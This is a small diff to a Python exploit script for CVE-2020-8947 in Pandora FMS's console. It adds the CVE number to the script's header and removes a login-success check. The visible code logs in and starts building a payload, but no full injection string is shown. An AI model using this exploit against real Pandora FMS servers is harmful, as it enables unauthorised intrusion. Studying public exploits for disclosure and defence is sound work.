@@ -142,6 +142,7 @@ incase default vulnerable variable won't work, change the position of payload to
 
 Author: Engin Demirbilek
 Github: github.com/EnginDemirbilek
+CVE: CVE-2020-8947
 
 '''
 import requests
@@ -164,12 +165,6 @@ login = {
 req = requests.Session()
 print "Sendin login request ..."
 login = req.post(url+"/pandora_console/index.php?login=1", data=login)
-
-if login.status_code != 200:
-	print "[-] Seems like credentials are wrong."
-	exit()
-else:
-	print "[+] Succesfully logged in !"
 
 payload = {
 	'date':"",
